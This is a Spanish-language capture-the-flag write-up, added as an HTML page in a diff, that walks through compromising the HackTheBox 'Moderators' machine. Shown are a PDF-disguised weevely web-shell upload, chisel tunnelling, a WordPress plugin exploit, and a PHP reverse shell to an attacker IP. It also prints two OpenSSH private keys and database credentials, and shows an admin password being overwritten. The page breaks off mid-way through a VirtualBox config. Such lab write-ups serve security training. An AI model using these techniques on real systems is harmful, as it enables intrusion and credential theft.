@@ -1,0 +1,514 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Moderators HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/moderators.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Moderators HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Moderators de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Moderators de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Moderators HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Moderators HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Moderators de la plataforma de HackTheBox","headline":"Writeup Scrambled HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Moderators HackTheBox</h1>
+          <p>Resolución de la máquina Moderators de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.173
+Nmap scan report for 10.10.11.173
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Buscando posibles contenidos en php podemos fuzzear y encontramos reports</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">dir -u 10.10.11.173 -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt -t 100
+===============================================================
+[+] Threads:                 100
+[+] Url:                     http://10.10.11.173
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.php            (Status: 200) [Size: 11150]
+/about.php            (Status: 200) [Size: 11539]
+</span><span class="kd">/reports.php</span><span class="p">          (Status: 302) [Size: 7888] [--> index.php]
+/blog.php             (Status: 200) [Size: 13163]</span>
+</code></pre></div></div>
+
+<div><p>Fuzzeando posibles argumentos de report encontramos varias combinaciones de numeros</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u </span><span class="no">"http://10.10.11.173/reports.php?report=FUZZ"</span><span class="p"> --hw 417 -t 100
+
+Target: http://10.10.11.173/reports.php?report=FUZZ
+Total requests: 10000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000002590:   </span><span class="s2">200</span><span class="p">        274 L    523 W      9786 Ch     "2589"
+000003479:   </span><span class="s2">200</span><span class="p">        275 L    526 W      9831 Ch     "3478"
+000004222:   </span><span class="s2">200</span><span class="p">        273 L    523 W      9880 Ch     "4221"
+000007613:   </span><span class="s2">200</span><span class="p">        275 L    523 W      9790 Ch     "7612"
+000008122:   </span><span class="s2">200</span><span class="p">        273 L    522 W      9784 Ch     "8121"
+000009799:   </span><span class="s2">200</span><span class="p">        276 L    525 W      9887 Ch     "9798"</span>
+</code></pre></div></div>
+
+<div><p>Después mirarlos encontramos uno que nos da /logs y un hash que parece md5</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s </span><span class="no">"http://10.10.11.173/reports.php?report=9798"</span><span class="p"> |</span><span class="s2"> grep</span><span class="p"> Do -A8 |</span><span class="s2"> html2text</span><span class="p">
+[+] Domain : bethebest101.uk.htb
+[+] Vulnerability : Sensitive Information Disclosure
+[+] Impact : 3.5/4.0
+[+] Disclosed by : Karlos Young
+[+] Disclosed on : 11/19/2021
+[+] Posted on :
+[+] Approved :
+[+] Patched : NO
+[+] LOGS : logs/e21cece511f43a5cb18d4932429915ed/</span>
+</code></pre></div></div>
+
+<div><p>El md5 corresponde al numero del argumento correspondiente en este caso 9798</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ echo</span><span class="p"> -n 9798 |</span><span class="s2"> md5sum</span><span class="p">
+e21cece511f43a5cb18d4932429915ed  -</span>
+</code></pre></div></div>
+
+<div><p>También podemos ver un directorio uploads fuzzeando después de logs</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> dir -u 10.10.11.173/logs/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100
+===============================================================
+[+] Threads:                 100
+[+] Url:                     http://10.10.11.173/logs/
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 301) [Size: 315] [--> http://10.10.11.173/logs/css/]
+</span><span class="kd">/uploads</span><span class="p">              (Status: 301) [Size: 319] [--> http://10.10.11.173/logs/uploads/]</span>
+</code></pre></div></div>
+
+<div><p>Encontrámos un <a href="http://10.10.11.173/logs/743c41a921516b04afde48bb48e28ce6/logs.pdf">logs.pdf</a> en uno de esos hashes con el siguiente contenido</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Mirando la <a href="http://10.10.11.173/logs/report_log_upload.php">ruta</a> vemos que hay un campo donde podemos subir archivos pdf</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Algunas funciones como system dan problemas asi que usaremos <a href="https://github.com/epinna/weevely3">weevely</a> para crear un php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> weevely.py generate shell shell.pdf.php
+Generated 'shell.pdf.php' with password 'shell' of 687 byte size.</span>
+</code></pre></div></div>
+
+<div><p>Al subir solo admite pdfs tenemos que agregar unas etiquetas para pasar el filtro</p></div>
+<div><p>Agregamos %PDF-1.5 y %%EOF además de modificar el Content-Type</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>De esta mánera el enviar podemos ver que se sube correctamente</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Lo invocamos con weevely y obtenemos shell aunque recomiendo hacer una reverse shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> weevely.py http://10.10.11.173/logs/uploads/shell.pdf.php shell
+
+[+] weevely 4.0.1
+[+] Target: 10.10.11.173
+
+</span><span class="na">weevely></span><span class="p"> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@moderators</span><span class="p">:</span><span class="na">~/html/logs/uploads</span><span class="p">$ hostname -I
+10.10.11.173 dead:beef::250:56ff:feb9:4a96
+</span><span class="s2">www-data@moderators</span><span class="p">:</span><span class="na">~/html/logs/uploads</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En puerto 8080 esta abierto asi que lo pasamos a local con chisel</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ chisel</span><span class="p"> server --reverse --port 8000
+server: Reverse tunnelling enabled
+server: Listening on http://0.0.0.0:8000</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@moderators</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 &
+Connecting to ws://10.10.14.10:8000
+Connected (Latency 12.495305ms)
+</span><span class="s2">www-data@moderators</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos aprovecharnos de el siguiente <a href="https://www.exploit-db.com/exploits/39591">exploit</a> para escalar a lexi y convertirnos en usuario</p></div>
+<div><p>Empezamos crearndo un directorio en un lugar con permisos de escritura</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@moderators</span><span class="p">:</span><span class="na">~/html/logs/uploads</span><span class="p">$ mkdir user</span>
+</span><span class="s2">www-data@moderators</span><span class="p">:</span><span class="na">~/html/logs/uploads</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En el creamos un archivo wp-load.php con una reverse shell en php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@moderators</span><span class="p">:</span><span class="na">~/html/logs/uploads/user</span><span class="p">$ cat wp-load.php 
+&lt?php </span><span class="k">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"</span><span class="p">); ?>
+</span><span class="s2">www-data@moderators</span><span class="p">:</span><span class="na">~/html/logs/uploads/user</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora basta con invocarlo aprovechando la vulnerabilidad y recibimos shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="no">"http://localhost:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/user/"</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.173
+</span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">/opt/site.new/wp-content/plugins/brandfolder</span><span class="p">$ id
+uid=1001(lexi) gid=1001(lexi) groups=1001(lexi),1002(moderators)
+</span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">/opt/site.new/wp-content/plugins/brandfolder</span><span class="p">$ hostname -I
+10.10.11.173 dead:beef::250:56ff:feb9:4a96 
+</span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">/opt/site.new/wp-content/plugins/brandfolder</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver la id_rsa del usuario asi que nos conectamos por ssh mas cómodo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code></span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">~/.ssh</span><span class="p">$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code></span><span class="s2">❯ ssh </span><span class="p">lexi@10.10.11.173 -i id_rsa
+</span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1001(lexi) gid=1001(lexi) groups=1001(lexi),1002(moderators)
+</span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.173 dead:beef::250:56ff:feb9:4a96 
+</span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+5c3**************************268
+</span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora podemos ver el wp-config que contiene credenciales para mysql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code></span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">/opt/site.new</span><span class="p">$ cat wp-config.php | grep DB
+</span><span class="k">define</span><span class="p">( </span><span class="s2">'DB_NAME'</span><span class="p">, </span><span class="s2">'wordpress'</span><span class="p"> );
+</span><span class="k">define</span><span class="p">( </span><span class="s2">'DB_USER'</span><span class="p">, </span><span class="s2">'wordpressuser'</span><span class="p"> );
+</span><span class="k">define</span><span class="p">( </span><span class="s2">'DB_PASSWORD'</span><span class="p">, </span><span class="s2">'wordpresspassword123!!'</span><span class="p"> );
+</span><span class="k">define</span><span class="p">( </span><span class="s2">'DB_HOST'</span><span class="p">, </span><span class="s2">'localhost'</span><span class="p"> );
+</span><span class="k">define</span><span class="p">( </span><span class="s2">'DB_CHARSET'</span><span class="p">, </span><span class="s2">'utf8'</span><span class="p"> );
+</span><span class="k">define</span><span class="p">( </span><span class="s2">'DB_COLLATE'</span><span class="p">, </span><span class="s2">''</span><span class="p"> );
+</span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">/opt/site.new</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos <a href="https://www.useotools.com/es/wordpress-password-hash-generator/">generar</a></span><span class="p"> una nueva contraseña para el wordpress y cambiarla desde mysql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code></span><span class="s2">lexi@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$ mysql -Dwordpress -uwordpressuser -p'wordpresspassword123!!'
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+</span><span class="kd">MariaDB [wordpress]></span><span class="p"> UPDATE `wp_users` SET `user_pass` = '$P$BIsDcvvyUHRF.QKXlJzhA9.kgCsuxL/' WHERE user_login = 'admin';
+Query OK, 1 row affected (0.003 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+</span><span class="kd">MariaDB [wordpress]></span>
+</code></pre></div></div>
+
+<div><p>De antes tenemos el 8080 en nuestro equipo, tenemos que agregar el dominio al localhost</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> /etc/hosts | </span><span class="s2">head</span><span class="p"> -n1
+</span><span class="na">127.0.0.1</span><span class="p">       localhost moderators.htb</span>
+</code></pre></div></div>
+
+<div><p>Podemos acceder al <a href="http://moderators.htb:8080/wp-admin/">wp-admin</a> con la contraseña que hemos definido en la base de datos</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Daremos un vistazo a el apartado Passwords por si hay alguna almacenada</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Interesantemente john tiene guardada una id_rsa privada para conectarse por ssh</p></div>
+<div><p><img src="./6.png"><p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code></span><span class="p">-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----</span>
+</code></pre></div></div>
+
+<div><p>Con esta id_rsa autorizada nos podemos conectar por ssh con el usuario john</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> john@10.10.11.173 -i id_rsa
+</span><span class="s2">john@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(john) gid=1000(john) groups=1000(john),1002(moderators)
+</span><span class="s2">john@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.173 dead:beef::250:56ff:feb9:4a96 
+</span><span class="s2">john@moderators</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Hay un directorio el cual parece tener archivos de virtualbox</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">john@moderators</span><span class="p">:</span><span class="na">~/stuff/VBOX</span><span class="p">$ ls
+2019-08-01.vbox  2019.vdi
+</span><span class="s2">john@moderators</span><span class="p">:</span><span class="na">~/stuff/VBOX</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al archivo vbox hay que eliminar algunas cosas y modificar otras, finalmente quedaria algo asi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?</span><span class="kd">xml</span><span class="k"> version</span><span class="p">=</span><span class="s2">"1.0"</span><span class="p">?>
+</span><span class="c1">&lt!--
+** DO NOT EDIT THIS FILE.
+** If you make changes to this file while any VirtualBox related application
+** is running, your changes will be overwritten later, without taking effect.
+** Use VBoxManage or the VirtualBox Manager GUI to make changes.
+--></span><span class="p">
+&lt</span><span class="kd">VirtualBox</span><span class="k"> xmlns</span><span class="p">=</span><span class="s2">"http://www.virtualbox.org/"</span><span class="k"> version</span><span class="p">=</span><span class="s2">"1.16-windows"</span><span class="p">>
+  &lt</span><span class="kd">Machine</span><span class="k"> uuid</span><span class="p">=</span><span class="s2">"{528b3540-b8be-4677-b43f-7f4969137747}" </span><span class="k">name</span><span class="p">=</span><span class="s2">"Moderator 1"</span><span class="k"> OSType</span><span class="p">=</span><span class="s2">"Ubuntu_64"</span><span class="k"> snapshotFolder</span><span class="p">=</span><span class="s2">"Snapshots"</span><span class="k"> lastStateChange</span><span class="p">=</span><span class="s2">"2022-08-11T19:20:46Z"</span><span class="p">>
+    &lt</span><span class="kd">MediaRegistry</span><span class="p">>
+      &lt</span><span class="kd">HardDisks</span><span class="p">>
+        &lt</span><span class="kd">HardDisk</span><span class="k"> uuid</span><span class="p">=</span><span class="s2">"{12b147da-5b2d-471f-9e32-a32b1517ff4b}"</span><span class="k"> location</span><span class="p">=</span><span class="s2">"./2019.vdi"</span><span class="k"> format</span><span class="p">=</span><span class="s2">"VDI"</span><span class="k"> type</span><span class="p">=</span><span class="s2">"Normal"</span><span class="p">>
+          &lt</span><span class="kd">Property</span><span class="k"> name</span><span class="p">=</span><span class="s2">"CRYPT/KeyId" </span><span class="k">value</span><span class="p">=</span><span class="s2">"Moderator 1"</span><span class="p">/>
+          &lt</span><span class="kd">Property</span><span class="k"> name</span><span class="p">=</span><span class="s2">"CRYPT/KeyStore"</span><span class="k"> value</span><span class="p">=</span><span class="s2">"U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&#38;#13;&#38;#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAADssBk3IXYOVlXkLWlDd8JCJ8ZUN8FC&#38;#13;&#38;#10;kVQY8Ovl9vXMMyAAAABu5KwY/KgMH20LHptIADnZJ6gRrgSFLm+s6eJEaJx+ziBO&#38;#13;&#38;#10;AAByl/CysecMVxqIA8QKkYqCcCT+RiMz7PJCBnJ+/oGFI2DqAABAAAAAKGFz0b7a&#38;#13;&#38;#10;q8cFTdpSCXUCgvz+yFWcIi1i2jYow1/CS0CEEATdrtbMxzzANgoenuThAceBWSUQ&#38;#13;&#38;#10;FqJ4CioY8Qm3BA=="</span><span class="p">/>
+        &lt/</span><span class="kd">HardDisk</span><span class="p">>
+      &lt/</span><span class="kd">HardDisks</span><span class="p">>
+    &lt/</span><span class="kd">MediaRegistry</span><span class="p">>
+    &lt</span><span class="kd">ExtraData</span><span class="p">>
+      &lt</span><span class="kd">ExtraDataItem</span><span class="k"> name</span><span class="p">=</span><span class="s2">"GUI/LastCloseAction"</span><span class="k"> value</span><span class="p">=</span><span class="s2">"PowerOff"</span><span class="p">/>
+      &lt</span><span class="kd">ExtraDataItem</span><span class="k"> name</span><span class="p">=</span><span class="s2">"GUI/LastGuestSizeHint"</span><span class="k"> value</span><span class="p">=</span><span class="s2">"2560,1335"</span><span class="p">/>
